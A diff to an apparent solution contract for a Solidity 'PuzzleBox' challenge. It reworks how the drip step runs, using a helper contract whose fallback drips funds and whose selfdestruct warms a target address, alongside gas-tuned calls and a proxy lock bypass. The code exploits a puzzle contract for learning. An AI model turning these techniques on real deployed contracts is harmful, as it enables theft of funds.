@@ -6,7 +6,7 @@ import "./PuzzleBox.sol";
 contract PuzzleBoxSolution {
     function solve(PuzzleBox puzzle) external {
         // operate & drip & unlock
-        new Dripper(puzzle).drip();
+        _drip(puzzle);
 
         // creep
         puzzle.creep{gas: 96_032}();
@@ -22,6 +22,12 @@ contract PuzzleBoxSolution {
 
         // open
         _open(puzzle);
+    }
+
+    function _drip(PuzzleBox puzzle) private {
+        Dripper dripper = new Dripper(puzzle);
+        address(dripper).call("");
+        dripper.destroy();
     }
 
     function _torch(PuzzleBox puzzle) private {
@@ -90,20 +96,18 @@ contract Dripper {
         _puzzle = puzzle;
 
         // operate drip
-        _puzzle.operate();
+        puzzle.operate();
 
         // unlock torch
         PuzzleBoxProxy(payable(address(puzzle))).lock(PuzzleBox.torch.selector, false); // ??? wtf
     }
 
-    function drip() public {
-        _puzzle.drip{value: 1000}();
-
+    function destroy() public {
         // create and warm zip target address
         selfdestruct(payable(address(uint160(address(_puzzle)) + 2)));
     }
 
-    receive() external payable {
-        _puzzle.drip{value: msg.value}();
+    fallback() external payable {
+        _puzzle.drip{value: msg.value == 0 ? 1000 : msg.value}();
     }
 }
